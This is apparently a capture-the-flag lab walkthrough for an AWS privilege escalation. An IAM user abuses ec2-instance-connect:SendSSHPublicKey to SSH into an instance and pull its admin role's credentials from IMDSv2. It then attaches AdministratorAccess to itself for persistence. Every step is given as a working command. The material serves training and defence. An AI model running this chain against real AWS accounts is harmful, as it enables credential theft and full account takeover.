# Guided Walkthrough: One-Hop Privilege Escalation via ec2-instance-connect:SendSSHPublicKey

This scenario demonstrates a privilege escalation vulnerability where a user has permission to push SSH public keys to an EC2 instance via EC2 Instance Connect. When the target EC2 instance has an attached IAM role with administrative permissions, an attacker can SSH into the instance and extract the role's temporary credentials from the Instance Metadata Service (IMDS), gaining full administrator access to the AWS account.

EC2 Instance Connect is a convenient AWS feature that allows administrators to manage SSH access without maintaining long-lived SSH keys. However, when combined with privileged instance profiles, it creates a privilege escalation path. The `ec2-instance-connect:SendSSHPublicKey` permission allows an attacker to push a temporary SSH public key (valid for 60 seconds) to the instance's metadata, establish an SSH connection, and then query IMDSv2 to retrieve the temporary security credentials of the attached IAM role.

This attack is particularly dangerous because it provides direct access to high-privilege credentials without triggering typical IAM credential creation alerts (like `CreateAccessKey` or `CreateLoginProfile`). The credentials are already present in the IMDS — the attacker simply needs access to extract them.

## The Challenge

You start as `pl-prod-ec2-003-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has a narrow set of permissions: `ec2-instance-connect:SendSSHPublicKey` on the target EC2 instance, plus helpful recon permissions (`ec2:DescribeInstances`, `iam:GetInstanceProfile`, `iam:GetRole`).

Your goal is to reach `pl-prod-ec2-003-to-admin-ec2-admin-role`, an IAM role with `AdministratorAccess` that is attached to an EC2 instance via its instance profile. You cannot assume this role directly — but you can get inside the machine that's already running as it.

## Reconnaissance

First, confirm your starting identity:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ec2-003-to-admin-starting-user
```

Try something that requires elevated permissions to confirm you don't already have it:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — no admin access yet. Now let's look for EC2 instances with privileged roles. Your helpful `ec2:DescribeInstances` permission lets you enumerate running instances:

```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' \
  --output table
```

You'll find an instance with an instance profile attached. To check what role that instance profile maps to, use `iam:GetInstanceProfile`:

```bash
aws iam get-instance-profile --instance-profile-name pl-prod-ec2-003-to-admin-instance-profile \
  --query 'InstanceProfile.Roles[0].RoleName' --output text
# pl-prod-ec2-003-to-admin-ec2-admin-role
```

Then verify the role's permissions with `iam:GetRole` and associated policy calls — you'll confirm it has `AdministratorAccess`. You've found your target.

## Exploitation

### Step 1: Generate a temporary SSH key pair

EC2 Instance Connect works by pushing a public key to the instance for a 60-second window. You need to generate a key pair first:

```bash
ssh-keygen -t rsa -f /tmp/ec2-connect-key -N '' -q
```

This creates `/tmp/ec2-connect-key` (private key) and `/tmp/ec2-connect-key.pub` (public key).

### Step 2: Push the public key via SendSSHPublicKey

Now use `ec2-instance-connect:SendSSHPublicKey` to push your public key to the instance. This is the privilege escalation vector — your starting user has this permission on the target instance:

```bash
aws ec2-instance-connect send-ssh-public-key \
  --region us-east-1 \
  --instance-id i-xxxxxxxxx \
  --instance-os-user ec2-user \
  --ssh-public-key file:///tmp/ec2-connect-key.pub
```

The API call succeeds and the key is now loaded in the instance's authorized keys — but only for 60 seconds. The clock is ticking.

### Step 3: SSH into the instance and extract IMDS credentials

Within that 60-second window, connect to the instance and query IMDSv2 to retrieve the temporary credentials of the attached admin role. Because the demo script runs this non-interactively, the entire IMDS query is bundled into a single remote command:

```bash
ssh -i /tmp/ec2-connect-key \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=10 \
  ec2-user@<instance-public-ip> \
  'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'
```

The output is a JSON object containing `AccessKeyId`, `SecretAccessKey`, and `Token` for `pl-prod-ec2-003-to-admin-ec2-admin-role`.

### Step 4: Configure credentials and escalate

Parse the JSON and export the extracted credentials:

```bash
export AWS_ACCESS_KEY_ID="<extracted AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<extracted SecretAccessKey>"
export AWS_SESSION_TOKEN="<extracted Token>"
```

Now use the admin role credentials to attach `AdministratorAccess` to the starting user — permanently cementing admin access even after the temporary role credentials expire:

```bash
aws iam attach-user-policy \
  --user-name pl-prod-ec2-003-to-admin-starting-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Verification

Switch back to the original starting user credentials and wait ~15 seconds for IAM policy propagation:

```bash
export AWS_ACCESS_KEY_ID="<original starting user key id>"
export AWS_SECRET_ACCESS_KEY="<original starting user secret>"
unset AWS_SESSION_TOKEN

sleep 15

aws iam list-users --max-items 3 --output table
```

Success — you can now list IAM users, confirming the starting user has been elevated to administrator access.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ec2-003-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the combination of two misconfigurations: an IAM policy granting `ec2-instance-connect:SendSSHPublicKey` on a specific EC2 instance, and that instance running with an administrative IAM role attached via its instance profile. Neither condition alone is necessarily catastrophic, but together they form a direct privilege escalation path.

The key insight is that EC2 Instance Connect is designed for convenience, not isolation. The `SendSSHPublicKey` permission is often treated as low-risk because the key only lasts 60 seconds — but 60 seconds is more than enough time to query IMDS and extract credentials that remain valid for hours. In real environments, this attack pattern appears wherever developers are given SSH access to "their" instances without careful review of what roles those instances carry.
